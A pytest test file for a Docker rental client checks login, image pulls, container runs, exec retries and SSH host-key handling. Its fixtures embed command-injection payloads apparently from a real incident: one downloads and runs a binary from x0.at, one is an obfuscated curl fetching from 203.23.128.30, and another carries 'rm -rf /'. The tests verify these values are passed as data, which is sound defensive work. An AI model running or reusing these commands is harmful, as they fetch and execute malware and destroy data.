import base64
import json
import os
import socket
import struct
import threading
from pathlib import Path
from unittest.mock import Mock

import pytest
from docker import auth as docker_auth
from docker.errors import APIError
from docker.types import ContainerConfig

import services.rental_docker_sdk as rental_docker_sdk
from datura.requests.miner_requests import ExecutorSSHInfo
from services.rental_docker_sdk import (
    ContainerExecSpec,
    ContainerRunSpec,
    DeviceMount,
    GpuDeviceRequest,
    PortBinding,
    RentalDockerConnectionError,
    RentalDockerOperationError,
    RentalDockerSdkClient,
    RentalDockerSdkClientFactory,
    VolumeMount,
    build_authorized_keys_exec_spec,
    build_environment_exec_spec,
    build_remove_authorized_keys_exec_spec,
    require_rental_docker_ssh_host_key,
    _build_rental_ssh_http_adapter_class,
)


INCIDENT_DOCKER_PASSWORD = (
    "x' | curl -fsSL https://x0.at/mney -o /tmp/mney"
    "&&chmod +x /tmp/mney && /tmp/mney   |echo '"
)
INCIDENT_PUBLIC_KEY = "';  c'u'''''r\\l'''' -o /tmp/systemd 203.23.128.30:443/linux_wss;'"
SETNS_OCI_EXEC_ERROR = (
    "OCI runtime exec failed: exec failed: container_linux.go:439: "
    "starting container process caused: process_linux.go:119: "
    "executing setns process caused: exit status 1\r\n"
)
CGROUP_OCI_EXEC_ERROR = (
    "OCI runtime exec failed: exec failed: container_linux.go:439: "
    "starting container process caused: process_linux.go:140: adding pid 123 "
    "to cgroups caused: failed to write 123: openat2 "
    "/sys/fs/cgroup/init.scope (deleted)/cgroup.procs: no such file or directory\r\n"
)


def _container_state(
    *,
    status: str = "running",
    running: bool = True,
    restarting: bool = False,
    paused: bool = False,
    dead: bool = False,
    exit_code: int = 0,
    error: str = "",
) -> dict:
    return {
        "State": {
            "Status": status,
            "Running": running,
            "Restarting": restarting,
            "Paused": paused,
            "Dead": dead,
            "ExitCode": exit_code,
            "Error": error,
        }
    }


class FakeApiClient:
    def __init__(self):
        self.login_calls = []
        self.inspected_images = []
        self.missing_images = set()
        self.inspect_image_error = None
        self.host_config_kwargs = None
        self.created_container = None
        self.started = []
        self.stopped = []
        self.exec_created = []
        self.exec_started = []
        self.exec_inspected = []
        self.containers_inspected = []
        self.container_states = None
        self.events = []
        self.pruned_images = False
        self.created_volumes = []
        self.removed_volumes = []
        self.timeout = 60
        self.closed = False

    def create_host_config(self, **kwargs):
        self.host_config_kwargs = kwargs
        return {"host_config": True}

    def login(self, **kwargs):
        self.login_calls.append(kwargs)

    def inspect_image(self, image):
        self.inspected_images.append(image)
        if self.inspect_image_error is not None:
            raise self.inspect_image_error
        if image in self.missing_images:
            raise ImageNotFound("missing image")
        return {"Id": "image-id"}

    def create_container(self, **kwargs):
        self.created_container = kwargs
        return {"Id": "container-id"}

    def start(self, container_name):
        self.started.append(container_name)

    def stop(self, container_name, timeout=None):
        self.stopped.append({"container_name": container_name, "timeout": timeout})

    def exec_create(self, **kwargs):
        self.events.append("exec_create")
        self.exec_created.append(kwargs)
        return {"Id": "exec-id"}

    def exec_start(self, exec_id, **kwargs):
        self.exec_started.append((exec_id, kwargs))
        return (b"stdout", b"stderr")

    def exec_inspect(self, exec_id):
        self.exec_inspected.append(exec_id)
        return {"ExitCode": 0}

    def inspect_container(self, container_name):
        self.events.append("inspect_container")
        self.containers_inspected.append(container_name)
        if self.container_states is not None:
            if len(self.container_states) > 1:
                return self.container_states.pop(0)
            return self.container_states[0]
        return {"State": {"Running": True, "Restarting": False}}

    def prune_images(self):
        self.pruned_images = True
        return {"ImagesDeleted": []}

    def create_volume(self, **kwargs):
        self.created_volumes.append({**kwargs, "client_timeout": self.timeout})
        return {"Name": kwargs.get("name")}

    def remove_volume(self, volume_name, **kwargs):
        self.removed_volumes.append((volume_name, kwargs))

    def close(self):
        self.closed = True


def _container_restarting_error() -> APIError:
    return APIError(
        '409 Client Error for http+docker://ssh/v1.52/containers/pod_exec/exec: '
        'Conflict ("Container abc123 is restarting, wait until the container is running")'
    )


def _other_conflict_error() -> APIError:
    return APIError(
        '409 Client Error for http+docker://ssh/v1.52/containers/pod_exec/exec: '
        'Conflict ("container name is already in use")'
    )


class RestartingExecCreateApiClient(FakeApiClient):
    def __init__(self):
        super().__init__()
        self.remaining_restarts = 1

    def exec_create(self, **kwargs):
        self.events.append("exec_create")
        self.exec_created.append(kwargs)
        if self.remaining_restarts:
            self.remaining_restarts -= 1
            raise _container_restarting_error()
        return {"Id": "exec-id"}


class RestartingExecStartApiClient(FakeApiClient):
    def __init__(self):
        super().__init__()
        self.remaining_restarts = 1
        self.next_exec_id = 0

    def exec_create(self, **kwargs):
        self.events.append("exec_create")
        self.exec_created.append(kwargs)
        self.next_exec_id += 1
        return {"Id": f"exec-id-{self.next_exec_id}"}

    def exec_start(self, exec_id, **kwargs):
        self.exec_started.append((exec_id, kwargs))
        if self.remaining_restarts:
            self.remaining_restarts -= 1
            raise _container_restarting_error()
        return (b"stdout", b"stderr")


class OtherConflictExecCreateApiClient(FakeApiClient):
    def exec_create(self, **kwargs):
        self.events.append("exec_create")
        self.exec_created.append(kwargs)
        raise _other_conflict_error()


class ExecResultApiClient(FakeApiClient):
    def __init__(
        self,
        *,
        failing_stdout: str,
        failing_exit_status: int,
        remaining_failures: int = 1,
    ):
        super().__init__()
        self.failing_stdout = failing_stdout
        self.failing_exit_status = failing_exit_status
        self.remaining_failures = remaining_failures
        self.failed_exec_ids = set()
        self.next_exec_id = 0

    def exec_create(self, **kwargs):
        self.events.append("exec_create")
        self.exec_created.append(kwargs)
        self.next_exec_id += 1
        return {"Id": f"exec-id-{self.next_exec_id}"}

    def exec_start(self, exec_id, **kwargs):
        self.exec_started.append((exec_id, kwargs))
        if self.remaining_failures:
            self.remaining_failures -= 1
            self.failed_exec_ids.add(exec_id)
            return (self.failing_stdout.encode(), b"")
        return (b"stdout", b"stderr")

    def exec_inspect(self, exec_id):
        self.exec_inspected.append(exec_id)
        if exec_id in self.failed_exec_ids:
            return {"ExitCode": self.failing_exit_status}
        return {"ExitCode": 0}


class SocketExecApiClient(FakeApiClient):
    def __init__(self):
        super().__init__()
        self.stdin_received = b""
        self.server_thread = None

    def exec_start(self, exec_id, **kwargs):
        if kwargs != {"socket": True}:
            return super().exec_start(exec_id, **kwargs)

        self.exec_started.append((exec_id, kwargs))
        client_socket, server_socket = socket.socketpair()

        def serve_exec_socket():
            try:
                chunks = []
                while True:
                    chunk = server_socket.recv(4096)
                    if not chunk:
                        break
                    chunks.append(chunk)
                self.stdin_received = b"".join(chunks)

                for stream, payload in (
                    (1, b"socket-stdout"),
                    (2, b"socket-stderr"),
                ):
                    header = struct.pack(">BxxxL", stream, len(payload))
                    server_socket.sendall(header + payload)
            finally:
                server_socket.close()

        self.server_thread = threading.Thread(target=serve_exec_socket)
        self.server_thread.start()
        return client_socket


class PullApiClient(FakeApiClient):
    def __init__(self):
        super().__init__()
        self.post_calls = []
        self.pull_events = [{"status": "Pull complete"}]
        self.raise_for_status_called = False
        self.stream_decode = None
        self._auth_configs = None

    def _url(self, path):
        return f"http://docker.test{path}"

    def _post(self, *args, **kwargs):
        response = object()
        self.post_calls.append({"args": args, "kwargs": kwargs, "response": response})
        return response

    def _raise_for_status(self, response):
        self.raise_for_status_called = True

    def _stream_helper(self, response, *, decode=False):
        self.stream_decode = decode
        return self.pull_events


class LoginThenPullApiClient(PullApiClient):
    def __init__(self):
        super().__init__()
        self.credstore_env = None
        self._auth_configs = docker_auth.AuthConfig({"auths": {}})

    def login(self, *, username, password, registry=None, reauth=False):
        self.login_calls.append(
            {
                "username": username,
                "password": password,
                "registry": registry,
                "reauth": reauth,
            }
        )
        self._auth_configs.add_auth(
            registry or docker_auth.INDEX_NAME,
            {"username": username, "password": password, "serveraddress": registry},
        )


class ImageNotFound(Exception):
    pass


@pytest.mark.asyncio
async def test_login_passes_credentials_as_sdk_data():
    api_client = FakeApiClient()
    client = RentalDockerSdkClient(api_client)
    username = "user'; rm -rf / #"

    await client.login(
        username=username, password=INCIDENT_DOCKER_PASSWORD, image="ubuntu:latest"
    )

    assert api_client.login_calls == [
        {
            "username": username,
            "password": INCIDENT_DOCKER_PASSWORD,
            "registry": None,
            "reauth": True,
        }
    ]


@pytest.mark.parametrize(
    ("image", "expected_registry"),
    [
        ("registry.digitalocean.com/team/app:1.0", "registry.digitalocean.com"),
        ("daturaai/pytorch:test", None),
        ("localhost:5000/team/app:1", "localhost:5000"),
    ],
)
@pytest.mark.asyncio
async def test_login_resolves_registry_from_image(image, expected_registry):
    api_client = FakeApiClient()
    client = RentalDockerSdkClient(api_client)

    await client.login(username="team-user", password=INCIDENT_DOCKER_PASSWORD, image=image)

    assert api_client.login_calls[0]["registry"] == expected_registry


@pytest.mark.parametrize(
    "password",
    [
        "cJhMt$8^?jc)n8&",
        "Grande@Cor#Hube&Pasa307",
        "dcb&L#%iJh^c@DXHNJommE@94$!Qk!9n",
        "k!&2Ruz3jnbQ@EcB42bU",
    ],
)
@pytest.mark.asyncio
async def test_login_preserves_legitimate_password_metacharacters(password):
    api_client = FakeApiClient()
    client = RentalDockerSdkClient(api_client)

    await client.login(
        username="registry-user", password=password, image="daturaai/pytorch:test"
    )

    assert api_client.login_calls[0]["password"] == password


@pytest.mark.asyncio
async def test_pull_sends_registry_auth_header_for_private_registry_login():
    api_client = LoginThenPullApiClient()
    client = RentalDockerSdkClient(api_client, pull_timeout_seconds=123)
    image = "registry.digitalocean.com/team/app:1.0"

    await client.login(
        username="team-user", password=INCIDENT_DOCKER_PASSWORD, image=image
    )
    await client.pull(image=image)

    headers = api_client.post_calls[0]["kwargs"]["headers"]
    assert "X-Registry-Auth" in headers
    decoded = json.loads(base64.urlsafe_b64decode(headers["X-Registry-Auth"]))
    assert decoded["serveraddress"] == "registry.digitalocean.com"
    assert decoded["username"] == "team-user"


@pytest.mark.asyncio
async def test_pull_overrides_docker_sdk_unbounded_timeout():
    api_client = PullApiClient()
    client = RentalDockerSdkClient(api_client, pull_timeout_seconds=123)

    await client.pull(image="registry.example/app:tag")

    assert api_client.post_calls[0]["args"] == ("http://docker.test/images/create",)
    assert api_client.post_calls[0]["kwargs"]["params"] == {
        "tag": "tag",
        "fromImage": "registry.example/app",
    }
    assert api_client.post_calls[0]["kwargs"]["headers"] == {}
    assert api_client.post_calls[0]["kwargs"]["stream"] is True
    assert api_client.post_calls[0]["kwargs"]["timeout"] == 123
    assert api_client.raise_for_status_called is True
    assert api_client.stream_decode is True


@pytest.mark.asyncio
async def test_pull_stream_error_is_reported_as_sdk_operation_failure():
    api_client = PullApiClient()
    api_client.pull_events = [
        {"errorDetail": {"message": "manifest unavailable"}},
    ]
    client = RentalDockerSdkClient(api_client, pull_timeout_seconds=123)

    with pytest.raises(RentalDockerOperationError, match="manifest unavailable"):
        await client.pull(image="registry.example/missing:tag")


@pytest.mark.asyncio
async def test_image_exists_inspects_image_as_sdk_data():
    api_client = FakeApiClient()
    client = RentalDockerSdkClient(api_client)

    assert await client.image_exists(image="registry.example/app:tag") is True

    assert api_client.inspected_images == ["registry.example/app:tag"]


@pytest.mark.asyncio
async def test_image_exists_returns_false_for_missing_image():
    api_client = FakeApiClient()
    api_client.missing_images.add("registry.example/missing:tag")
    client = RentalDockerSdkClient(api_client)

    assert await client.image_exists(image="registry.example/missing:tag") is False

    assert api_client.inspected_images == ["registry.example/missing:tag"]


@pytest.mark.asyncio
async def test_stop_forwards_grace_as_docker_py_timeout():
    # Arrange: the SIGTERM grace must cross into docker-py as its `timeout` kwarg —
    # every delete test fakes this client, so this seam is the only place it's verified
    api_client = FakeApiClient()
    client = RentalDockerSdkClient(api_client)

    # Act
    await client.stop(container_name="pod_stop", stop_grace_seconds=30)

    # Assert
    assert api_client.stopped == [{"container_name": "pod_stop", "timeout": 30}]


@pytest.mark.asyncio
async def test_stop_without_grace_keeps_docker_py_default():
    # Arrange: callers that pass no grace (e.g. pause-pod stop_container) must keep
    # docker-py's timeout=None, i.e. the daemon default grace
    api_client = FakeApiClient()
    client = RentalDockerSdkClient(api_client)

    # Act
    await client.stop(container_name="pod_stop_default")

    # Assert
    assert api_client.stopped == [{"container_name": "pod_stop_default", "timeout": None}]


@pytest.mark.asyncio
async def test_run_container_maps_spec_to_docker_sdk_api():
    api_client = FakeApiClient()
    client = RentalDockerSdkClient(api_client)

    await client.run_container(
        ContainerRunSpec(
            image="registry.example/app:tag",
            name="pod_test",
            command=("sh", "-c", "echo inside"),
            environment={"HOSTILE_ENV": "value'; echo SHOULD_NOT_RUN; $(echo nope)"},
            ports=(PortBinding(container_port=22, host_port=30022),),
            volumes=(VolumeMount(source="volume_test", target="/workspace"),),
            restart_policy="unless-stopped",
            cap_add=("NET_ADMIN",),
            sysctls={"net.ipv4.conf.all.src_valid_mark": "1"},
            devices=(
                DeviceMount(
                    path_on_host="/dev/nvidia0",
                    path_in_container="/dev/nvidia0",
                ),
            ),
            device_requests=(
                GpuDeviceRequest(device_ids=("GPU-test",)),
            ),
            cpu_count=2,
            memory_gb=8,
            storage_limit_gb=20,
            shm_size="1g",
        )
    )

    assert api_client.created_container["image"] == "registry.example/app:tag"
    assert api_client.created_container["name"] == "pod_test"
    assert api_client.created_container["command"] == ["sh", "-c", "echo inside"]
    assert api_client.created_container["environment"]["HOSTILE_ENV"].startswith("value'")
    assert api_client.host_config_kwargs["port_bindings"] == {"22/tcp": 30022}
    assert api_client.host_config_kwargs["binds"] == ["volume_test:/workspace:rw"]
    assert api_client.host_config_kwargs["restart_policy"] == {"Name": "unless-stopped"}
    assert api_client.host_config_kwargs["devices"] == [
        "/dev/nvidia0:/dev/nvidia0:rwm"
    ]
    assert dict(api_client.host_config_kwargs["device_requests"][0]) == {
        "Driver": "",
        "Count": 0,
        "DeviceIDs": ["GPU-test"],
        "Capabilities": [["gpu"]],
        "Options": {},
    }
    assert api_client.host_config_kwargs["nano_cpus"] == 2_000_000_000
    assert api_client.host_config_kwargs["mem_limit"] == "8g"
    assert api_client.host_config_kwargs["storage_opt"] == {"size": "20g"}
    assert api_client.started == ["pod_test"]


@pytest.mark.asyncio
async def test_run_container_exposes_ports_without_duplicate_protocol_suffix():
    api_client = FakeApiClient()
    client = RentalDockerSdkClient(api_client)

    await client.run_container(
        ContainerRunSpec(
            image="registry.example/app:tag",
            name="pod_test",
            ports=(
                PortBinding(container_port=22, host_port=30022),
                PortBinding(container_port=40000, host_port=30040),
            ),
        )
    )

    container_config = ContainerConfig(
        version="1.52",
        image=api_client.created_container["image"],
        command=api_client.created_container["command"],
        ports=api_client.created_container["ports"],
    )

    assert container_config["ExposedPorts"] == {
        "22/tcp": {},
        "40000/tcp": {},
    }
    assert api_client.host_config_kwargs["port_bindings"] == {
        "22/tcp": 30022,
        "40000/tcp": 30040,
    }


@pytest.mark.asyncio
async def test_exec_in_container_passes_argv_and_environment_as_data():
    api_client = FakeApiClient()
    client = RentalDockerSdkClient(api_client)

    result = await client.exec_in_container(
        ContainerExecSpec(
            container_name="pod_exec",
            argv=("sh", "-c", "cat /tmp/file"),
            environment={"A": "B"},
        )
    )

    assert result.exit_status == 0
    assert result.stdout == "stdout"
    assert result.stderr == "stderr"
    assert api_client.exec_created == [
        {
            "container": "pod_exec",
            "cmd": ["sh", "-c", "cat /tmp/file"],
            "stdin": False,
            "environment": {"A": "B"},
            # DAH-2534: pinned so a non-root image USER cannot break /root writes.
            "user": "0",
        }
    ]
    assert api_client.exec_started == [("exec-id", {"demux": True})]
    assert api_client.containers_inspected == ["pod_exec"]


@pytest.mark.asyncio
async def test_exec_in_container_with_stdin_demuxes_socket_stdout_and_stderr():
    api_client = SocketExecApiClient()
    client = RentalDockerSdkClient(api_client)

    result = await client.exec_in_container(
        ContainerExecSpec(
            container_name="pod_exec",
            argv=("sh", "-c", "cat > /tmp/file"),
            stdin="stdin payload\n",
        )
    )
    api_client.server_thread.join(timeout=1)

    assert api_client.server_thread.is_alive() is False
    assert api_client.stdin_received == b"stdin payload\n"
    assert result.exit_status == 0
    assert result.stdout == "socket-stdout"
    assert result.stderr == "socket-stderr"
    assert api_client.exec_created == [
        {
            "container": "pod_exec",
            "cmd": ["sh", "-c", "cat > /tmp/file"],
            "stdin": True,
            "environment": None,
            "user": "0",
        }
    ]
    assert api_client.exec_started == [("exec-id", {"socket": True})]
    assert api_client.containers_inspected == ["pod_exec"]


@pytest.mark.asyncio
async def test_exec_in_container_waits_for_container_ready_before_first_exec(monkeypatch):
    monkeypatch.setattr(rental_docker_sdk, "_DOCKER_EXEC_READY_POLL_INTERVAL_SECONDS", 0)
    api_client = FakeApiClient()
    api_client.container_states = [
        _container_state(status="restarting", running=True, restarting=True),
        _container_state(status="restarting", running=True, restarting=True),
        _container_state(),
    ]
    client = RentalDockerSdkClient(api_client)

    result = await client.exec_in_container(
        ContainerExecSpec(
            container_name="pod_exec",
            argv=("sh", "-c", "cat /tmp/file"),
        )
    )

    assert result.exit_status == 0
    assert result.stdout == "stdout"
    assert api_client.events == [
        "inspect_container",
        "inspect_container",
        "inspect_container",
        "exec_create",
    ]
    assert len(api_client.exec_created) == 1


@pytest.mark.asyncio
async def test_exec_in_container_fails_without_exec_when_container_exited():
    api_client = FakeApiClient()
    api_client.container_states = [
        _container_state(
            status="exited",
            running=False,
            exit_code=42,
            error="startup command failed",
        )
    ]
    client = RentalDockerSdkClient(api_client)

    with pytest.raises(
        RentalDockerOperationError,
        match="status='exited'.*exit_code=42.*startup command failed",
    ):
        await client.exec_in_container(
            ContainerExecSpec(
                container_name="pod_exec",
                argv=("sh", "-c", "cat /tmp/file"),
            )
        )

    assert api_client.exec_created == []
    assert api_client.events == ["inspect_container"]


@pytest.mark.asyncio
async def test_exec_in_container_fails_without_exec_when_container_never_ready(monkeypatch):
    monkeypatch.setattr(rental_docker_sdk, "_DOCKER_EXEC_READY_TIMEOUT_SECONDS", 0)
    api_client = FakeApiClient()
    api_client.container_states = [
        _container_state(status="restarting", running=True, restarting=True)
    ]
    client = RentalDockerSdkClient(api_client)

    with pytest.raises(
        RentalDockerOperationError,
        match="did not become ready for exec",
    ):
        await client.exec_in_container(
            ContainerExecSpec(
                container_name="pod_exec",
                argv=("sh", "-c", "cat /tmp/file"),
            )
        )

    assert api_client.exec_created == []
    assert api_client.events == ["inspect_container"]


@pytest.mark.asyncio
async def test_exec_in_container_retries_transient_container_restarting_on_exec_create(monkeypatch):
    monkeypatch.setattr(
        rental_docker_sdk,
        "_DOCKER_EXEC_TRANSIENT_RETRY_DELAYS_SECONDS",
        (0,),
    )
    api_client = RestartingExecCreateApiClient()
    client = RentalDockerSdkClient(api_client)

    result = await client.exec_in_container(
        ContainerExecSpec(
            container_name="pod_exec",
            argv=("sh", "-c", "cat /tmp/file"),
        )
    )

    assert result.exit_status == 0
    assert result.stdout == "stdout"
    assert len(api_client.exec_created) == 2
    assert api_client.exec_started == [("exec-id", {"demux": True})]
    assert api_client.containers_inspected == ["pod_exec", "pod_exec"]


@pytest.mark.asyncio
async def test_exec_in_container_rechecks_readiness_before_retry(monkeypatch):
    monkeypatch.setattr(
        rental_docker_sdk,
        "_DOCKER_EXEC_TRANSIENT_RETRY_DELAYS_SECONDS",
        (0,),
    )
    api_client = RestartingExecCreateApiClient()
    client = RentalDockerSdkClient(api_client)

    result = await client.exec_in_container(
        ContainerExecSpec(
            container_name="pod_exec",
            argv=("sh", "-c", "cat /tmp/file"),
        )
    )

    assert result.exit_status == 0
    assert api_client.containers_inspected == ["pod_exec", "pod_exec"]
    assert len(api_client.exec_created) == 2


@pytest.mark.asyncio
async def test_exec_in_container_retries_transient_container_restarting_on_exec_start(monkeypatch):
    monkeypatch.setattr(
        rental_docker_sdk,
        "_DOCKER_EXEC_TRANSIENT_RETRY_DELAYS_SECONDS",
        (0,),
    )
    api_client = RestartingExecStartApiClient()
    client = RentalDockerSdkClient(api_client)

    result = await client.exec_in_container(
        ContainerExecSpec(
            container_name="pod_exec",
            argv=("sh", "-c", "cat /tmp/file"),
        )
    )

    assert result.exit_status == 0
    assert result.stdout == "stdout"
    assert len(api_client.exec_created) == 2
    assert api_client.exec_started == [
        ("exec-id-1", {"demux": True}),
        ("exec-id-2", {"demux": True}),
    ]
    assert api_client.containers_inspected == ["pod_exec", "pod_exec"]


@pytest.mark.asyncio
async def test_exec_in_container_keeps_original_restart_conflict_after_retry_budget(monkeypatch):
    monkeypatch.setattr(
        rental_docker_sdk,
        "_DOCKER_EXEC_TRANSIENT_RETRY_DELAYS_SECONDS",
        (0, 0),
    )
    api_client = RestartingExecCreateApiClient()
    api_client.remaining_restarts = 10
    client = RentalDockerSdkClient(api_client)

    with pytest.raises(
        RentalDockerOperationError,
        match="Container abc123 is restarting, wait until the container is running",
    ):
        await client.exec_in_container(
            ContainerExecSpec(
                container_name="pod_exec",
                argv=("sh", "-c", "cat /tmp/file"),
            )
        )

    assert len(api_client.exec_created) == 3
    assert api_client.exec_started == []
    assert api_client.containers_inspected == ["pod_exec", "pod_exec", "pod_exec"]


@pytest.mark.asyncio
async def test_exec_in_container_does_not_retry_other_conflicts(monkeypatch):
    monkeypatch.setattr(
        rental_docker_sdk,
        "_DOCKER_EXEC_TRANSIENT_RETRY_DELAYS_SECONDS",
        (0, 0),
    )
    api_client = OtherConflictExecCreateApiClient()
    client = RentalDockerSdkClient(api_client)

    with pytest.raises(
        RentalDockerOperationError,
        match="container name is already in use",
    ):
        await client.exec_in_container(
            ContainerExecSpec(
                container_name="pod_exec",
                argv=("sh", "-c", "cat /tmp/file"),
            )
        )

    assert len(api_client.exec_created) == 1
    assert api_client.containers_inspected == ["pod_exec"]


@pytest.mark.parametrize(
    "transient_stdout",
    [
        SETNS_OCI_EXEC_ERROR,
        CGROUP_OCI_EXEC_ERROR,
    ],
)
@pytest.mark.asyncio
async def test_exec_in_container_retries_transient_oci_exec_result(
    monkeypatch,
    transient_stdout,
):
    monkeypatch.setattr(
        rental_docker_sdk,
        "_DOCKER_EXEC_TRANSIENT_RETRY_DELAYS_SECONDS",
        (0,),
    )
    api_client = ExecResultApiClient(
        failing_stdout=transient_stdout,
        failing_exit_status=128,
    )
    client = RentalDockerSdkClient(api_client)

    result = await client.exec_in_container(
        ContainerExecSpec(
            container_name="pod_exec",
            argv=("sh", "-c", "cat /tmp/file"),
        )
    )

    assert result.exit_status == 0
    assert result.stdout == "stdout"
    assert len(api_client.exec_created) == 2
    assert api_client.exec_started == [
        ("exec-id-1", {"demux": True}),
        ("exec-id-2", {"demux": True}),
    ]
    assert api_client.containers_inspected == ["pod_exec", "pod_exec"]


@pytest.mark.asyncio
async def test_exec_in_container_returns_transient_oci_result_after_retry_budget(monkeypatch):
    monkeypatch.setattr(
        rental_docker_sdk,
        "_DOCKER_EXEC_TRANSIENT_RETRY_DELAYS_SECONDS",
        (0, 0),
    )
    api_client = ExecResultApiClient(
        failing_stdout=SETNS_OCI_EXEC_ERROR,
        failing_exit_status=128,
        remaining_failures=10,
    )
    client = RentalDockerSdkClient(api_client)

    result = await client.exec_in_container(
        ContainerExecSpec(
            container_name="pod_exec",
            argv=("sh", "-c", "cat /tmp/file"),
        )
    )

    assert result.exit_status == 128
    assert result.stdout == SETNS_OCI_EXEC_ERROR
    assert len(api_client.exec_created) == 3
    assert api_client.containers_inspected == ["pod_exec", "pod_exec", "pod_exec"]


@pytest.mark.asyncio
async def test_exec_in_container_does_not_retry_non_transient_oci_result(monkeypatch):
    monkeypatch.setattr(
        rental_docker_sdk,
        "_DOCKER_EXEC_TRANSIENT_RETRY_DELAYS_SECONDS",
        (0, 0),
    )
    api_client = ExecResultApiClient(
        failing_stdout='OCI runtime exec failed: exec: "missing": executable file not found\r\n',
        failing_exit_status=127,
        remaining_failures=1,
    )
    client = RentalDockerSdkClient(api_client)

    result = await client.exec_in_container(
        ContainerExecSpec(
            container_name="pod_exec",
            argv=("missing",),
        )
    )

    assert result.exit_status == 127
    assert len(api_client.exec_created) == 1
    assert api_client.containers_inspected == ["pod_exec"]


def test_stdin_exec_spec_builders_keep_values_out_of_argv():
    public_key = INCIDENT_PUBLIC_KEY
    key_spec = build_authorized_keys_exec_spec(
        container_name="pod_key",
        public_keys=[public_key],
    )
    remove_key_spec = build_remove_authorized_keys_exec_spec(
        container_name="pod_key",
        public_keys=[public_key],
    )
    env_spec = build_environment_exec_spec(
        container_name="pod_env",
        environment={
            "HOSTILE_ENV": "value'; echo ENV_MARKER; $(echo env)",
            "MULTILINE_ENV": "line1\nENV_NEWLINE_MARKER",
        },
    )

    assert key_spec is not None
    assert public_key not in " ".join(key_spec.argv)
    assert key_spec.stdin == f"{public_key}\n"
    assert remove_key_spec is not None
    assert public_key not in " ".join(remove_key_spec.argv)
    assert remove_key_spec.stdin == f"{public_key}\n"
    assert "grep -vxF -f" in " ".join(remove_key_spec.argv)
    assert "/tmp/systemd" not in " ".join(remove_key_spec.argv)
    assert "203.23.128.30:443/linux_wss" not in " ".join(remove_key_spec.argv)
    assert env_spec is not None
    assert "ENV_MARKER" not in " ".join(env_spec.argv)
    assert "ENV_NEWLINE_MARKER" not in " ".join(env_spec.argv)
    assert "HOSTILE_ENV=value'; echo ENV_MARKER; $(echo env)\n" in env_spec.stdin
    assert "MULTILINE_ENV=line1\nENV_NEWLINE_MARKER\n" in env_spec.stdin


@pytest.mark.asyncio
async def test_delete_helpers_call_sdk_volume_and_prune_apis():
    api_client = FakeApiClient()
    client = RentalDockerSdkClient(api_client)

    await client.create_volume(
        volume_name="volume_test",
        driver="vloopback",
        driver_opts={"size": "23g"},
        timeout=133,
    )
    await client.prune_images()
    await client.remove_volume(volume_name="volume_test", force=True)

    assert api_client.created_volumes == [
        {
            "name": "volume_test",
            "driver": "vloopback",
            "driver_opts": {"size": "23g"},
            "client_timeout": 133,
        }
    ]
    assert api_client.timeout == 60
    assert api_client.pruned_images is True
    assert api_client.removed_volumes == [("volume_test", {"force": True})]


@pytest.mark.asyncio
async def test_factory_does_not_mutate_home_and_closes_client(monkeypatch):
    original_home = "/validator/home"
    monkeypatch.setenv("HOME", original_home)
    created = {}
    api_client = FakeApiClient()

    def api_client_factory(**kwargs):
        created["kwargs"] = kwargs
        created["observed_home"] = os.environ.get("HOME")
        return api_client

    def validate_known_hosts(known_hosts_path):
        created["key_mode"] = (
            known_hosts_path.parent / "id_executor"
        ).stat().st_mode & 0o777
        created["known_hosts"] = known_hosts_path.read_text()

    monkeypatch.setattr(
        "services.rental_docker_sdk._validate_paramiko_known_hosts",
        validate_known_hosts,
    )
    factory = RentalDockerSdkClientFactory(api_client_factory=api_client_factory)
    executor_info = ExecutorSSHInfo(
        uuid="executor-id",
        address="127.0.0.1",
        port=8000,
        ssh_username="root",
        ssh_port=2222,
        python_path="/usr/bin/python",
        root_dir="/root",
        ssh_host_key="ssh-ed25519 AAAATESTKEY",
    )

    async with factory.connect(
        executor_info=executor_info,
        private_key="PRIVATE KEY",
    ) as client:
        assert isinstance(client, RentalDockerSdkClient)

    assert created["kwargs"]["base_url"] == "ssh://root@127.0.0.1:2222"
    assert created["kwargs"]["use_ssh_client"] is False
    assert "PRIVATE KEY" not in str(created["kwargs"])
    assert created["observed_home"] == original_home
    assert created["key_mode"] == 0o600
    assert "[127.0.0.1]:2222 ssh-ed25519 AAAATESTKEY" in created["known_hosts"]
    assert os.environ.get("HOME") == original_home
    assert api_client.closed is True


@pytest.mark.asyncio
async def test_factory_fails_closed_without_executor_host_key():
    api_client_factory = Mock()
    factory = RentalDockerSdkClientFactory(api_client_factory=api_client_factory)
    executor_info = ExecutorSSHInfo(
        uuid="executor-id",
        address="127.0.0.1",
        port=8000,
        ssh_username="root",
        ssh_port=2222,
        python_path="/usr/bin/python",
        root_dir="/root",
        ssh_host_key=None,
    )

    with pytest.raises(RentalDockerConnectionError):
        async with factory.connect(
            executor_info=executor_info,
            private_key="PRIVATE KEY",
        ):
            pass

    api_client_factory.assert_not_called()


def test_require_rental_docker_ssh_host_key_rejects_blank_key():
    executor_info = ExecutorSSHInfo(
        uuid="executor-id",
        address="127.0.0.1",
        port=8000,
        ssh_username="root",
        ssh_port=2222,
        python_path="/usr/bin/python",
        root_dir="/root",
        ssh_host_key="   ",
    )

    with pytest.raises(RentalDockerConnectionError, match="missing ssh_host_key"):
        require_rental_docker_ssh_host_key(executor_info)


def test_require_rental_docker_ssh_host_key_strips_present_key():
    executor_info = ExecutorSSHInfo(
        uuid="executor-id",
        address="127.0.0.1",
        port=8000,
        ssh_username="root",
        ssh_port=2222,
        python_path="/usr/bin/python",
        root_dir="/root",
        ssh_host_key="  ssh-ed25519 AAAATESTKEY  ",
    )

    assert require_rental_docker_ssh_host_key(executor_info) == "ssh-ed25519 AAAATESTKEY"


def test_rental_ssh_adapter_uses_explicit_key_and_known_hosts(monkeypatch, tmp_path):
    import paramiko

    key_path = tmp_path / "id_executor"
    known_hosts_path = tmp_path / "known_hosts"
    key_path.write_text("PRIVATE KEY")
    known_hosts_path.write_text("[127.0.0.1]:2222 ssh-ed25519 AAAATESTKEY\n")
    calls = {}

    class FakeSSHClient:
        def load_host_keys(self, path):
            calls["host_keys_path"] = path

        def load_system_host_keys(self):
            raise AssertionError("system host keys should not be loaded")

        def set_missing_host_key_policy(self, policy):
            calls["policy"] = policy

    class FakeRejectPolicy:
        pass

    monkeypatch.setattr(paramiko, "SSHClient", FakeSSHClient)
    monkeypatch.setattr(paramiko, "RejectPolicy", FakeRejectPolicy)

    adapter_class = _build_rental_ssh_http_adapter_class(
        key_path=key_path,
        known_hosts_path=known_hosts_path,
    )
    adapter = adapter_class.__new__(adapter_class)

    adapter._create_paramiko_client("ssh://root@127.0.0.1:2222")

    assert adapter.ssh_params == {
        "hostname": "127.0.0.1",
        "port": 2222,
        "username": "root",
        "key_filename": str(key_path),
        "look_for_keys": False,
        "allow_agent": False,
    }
    assert calls["host_keys_path"] == str(known_hosts_path)
